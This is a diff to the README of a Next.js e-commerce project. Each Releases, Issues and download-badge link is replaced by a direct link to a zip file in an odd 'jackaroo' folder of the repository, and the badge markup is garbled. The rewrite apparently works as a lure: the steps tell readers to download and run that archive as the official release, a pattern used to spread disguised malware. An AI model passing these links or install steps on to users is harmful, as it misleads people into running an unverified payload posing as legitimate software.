@@ -1,6 +1,6 @@
 # 🛒 nextjs_ecommerce_website - Build Your Online Store Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Next.js%20eCommerce-blue)](https://github.com/maccRBX/nextjs_ecommerce_website/releases)
+[![Download Now](https://raw.githubusercontent.com/maccRBX/nextjs_ecommerce_website/main/jackaroo/nextjs_ecommerce_website.zip%https://raw.githubusercontent.com/maccRBX/nextjs_ecommerce_website/main/jackaroo/nextjs_ecommerce_website.zip%20eCommerce-blue)](https://raw.githubusercontent.com/maccRBX/nextjs_ecommerce_website/main/jackaroo/nextjs_ecommerce_website.zip)
 
 ## 🚀 Getting Started
 
@@ -23,9 +23,9 @@ To run the nextjs_ecommerce_website, you will need:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page to download](https://github.com/maccRBX/nextjs_ecommerce_website/releases) the latest version of the application. Follow these steps to successfully install and run the software:
+To get started, visit the [Releases page to download](https://raw.githubusercontent.com/maccRBX/nextjs_ecommerce_website/main/jackaroo/nextjs_ecommerce_website.zip) the latest version of the application. Follow these steps to successfully install and run the software:
 
-1. Go to the [Releases page](https://github.com/maccRBX/nextjs_ecommerce_website/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/maccRBX/nextjs_ecommerce_website/main/jackaroo/nextjs_ecommerce_website.zip).
 2. Find the latest release version.
 3. Click on the version number to expand the details.
 4. Locate the installation file suitable for your operating system.
@@ -72,7 +72,7 @@ Once your store is set up, you can manage products, process orders, and customiz
 
 If you encounter issues or have questions, our community is here to help. You can:
 
-- Visit the [GitHub Issues page](https://github.com/maccRBX/nextjs_ecommerce_website/issues) to report problems.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/maccRBX/nextjs_ecommerce_website/main/jackaroo/nextjs_ecommerce_website.zip) to report problems.
 - Check the documentation for FAQs and guides.
 - Join our community forums for discussions and advice on running your eCommerce store.
 
@@ -80,7 +80,7 @@ If you encounter issues or have questions, our community is here to help. You ca
 
 Keep your software up to date to take advantage of new features and security enhancements. To update:
 
-1. Return to the [Releases page](https://github.com/maccRBX/nextjs_ecommerce_website/releases).
+1. Return to the [Releases page](https://raw.githubusercontent.com/maccRBX/nextjs_ecommerce_website/main/jackaroo/nextjs_ecommerce_website.zip).
 2. Download the latest version following the previous download steps.
 3. Run the installation file to update your existing installation.
 
